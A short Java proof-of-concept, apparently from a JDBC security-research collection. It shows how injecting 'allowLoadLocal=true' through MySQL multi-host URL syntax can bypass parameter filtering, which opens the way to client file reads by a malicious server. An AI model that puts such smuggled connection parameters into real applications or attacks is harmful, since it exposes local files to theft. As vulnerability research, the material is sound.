package com.jdbc.tricks.multi_host;

import com.jdbc.tricks.utils.MysqlConnectionUtils;

/**
 * 测试在多host配置中注入allowLoadLocal参数的文件读取漏洞
 * 驱动版本：mysql-connector-java 8.0.12
 */
public class AllowLoadLocal_MultiHostInjectionBypass {

    public static void main(String[] args) {
        String url = "jdbc:mysql://(127.0.0.1,allowLoadLocal=true)/test";
        MysqlConnectionUtils.connect(url, "root", "root",true);
    }
}